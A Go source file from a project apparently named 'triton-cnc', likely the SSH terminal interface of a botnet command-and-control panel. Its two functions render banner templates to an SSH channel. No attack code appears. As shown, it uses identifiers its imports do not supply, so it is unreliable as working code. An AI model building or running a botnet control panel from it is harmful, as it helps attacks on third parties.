package terminal

import (
	"bufio"
	"errors"
	"strings"

	"golang.org/x/crypto/ssh"

	"triton-cnc/core/mysql"
	"triton-cnc/core/models/client"
	"triton-cnc/core/models/client/temp"
	"triton-cnc/core/models/client/term_pack"
)



func Banner(name string, user *database.User, Channel ssh.Channel, Color bool, Title bool, Custom map[string]string) (error, string) {

	Term := termfx.New()

	Term = template.Standard(Term, user, Color)

	for Name, Rep := range Custom {
		Term.RegisterVariable(Name, Rep)
	}


	Banner := client.ClientMap[name]
	if Banner == "" {
		return errors.New("invaild name"), ""
	}

	var (
		TitleString string = ""
		LineCount int = 0
	)

	NewScan := bufio.NewScanner(strings.NewReader(Banner))

	for NewScan.Scan() {

		Branding, error := Term.ExecuteString(NewScan.Text())
		if error != nil {
			continue
		}

		Branding = strings.Replace(Branding, "\\x1b", "", -1)
		Branding = strings.Replace(Branding, "\\033", "", -1)

		LineCount++

		if Title {
			if LineCount <= 1 {
				TitleString = Branding
				continue
			}

			continue
		} else {
			Channel.Write([]byte(Branding + "\r\n"))
			continue
		}
	}

	return nil, TitleString
}

func BannerString(String []string, user *database.User, Channel ssh.Channel, Color bool, Title bool, Custom map[string]string) (error, string) {

	Term := termfx.New()

	Term = template.Standard(Term, user, Color)

	for Name, Rep := range Custom {
		Term.RegisterVariable(Name, Rep)
	}


	var (
		TitleString string = ""
		LineCount int = 0
	)


	for _, Line := range String {

		Branding, error := Term.ExecuteString(Line)
		if error != nil {
			continue
		}

		Branding = strings.Replace(Branding, "\\x1b", "", -1)
		Branding = strings.Replace(Branding, "\\033", "", -1)

		LineCount++

		if Title {
			if LineCount <= 1 {
				TitleString = Branding
				continue
			}

			continue
		} else {
			Channel.Write([]byte(Branding + "\r\n"))
			continue
		}
	}

	return nil, TitleString
}